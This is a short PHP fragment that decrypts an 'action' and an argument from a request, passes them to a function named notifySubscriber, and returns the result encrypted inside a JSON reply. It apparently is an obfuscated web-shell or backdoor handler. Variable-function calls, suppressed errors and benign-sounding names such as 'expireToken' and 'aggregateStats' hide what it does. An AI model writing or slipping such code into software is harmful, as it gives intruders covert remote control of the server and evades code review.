$action = @$AD($em, $spanToken);
if ($action === false || empty($action)) aggregateStats();

$arg = '';
if (!empty($ed)) {
    $arg = @$AD($ed, $spanToken);
    if ($arg === false) $arg = '';
}

$result = notifySubscriber($action, $arg, $spanToken);

header('Content-Type: application/json');
$AE = 'expireToken';
$enc = @$AE($result, $spanToken);
if (empty($enc)) aggregateStats();
echo json_encode(array('status' => 200, 'rid' => $rid, 'payload' => $enc, 'ts' => time()));
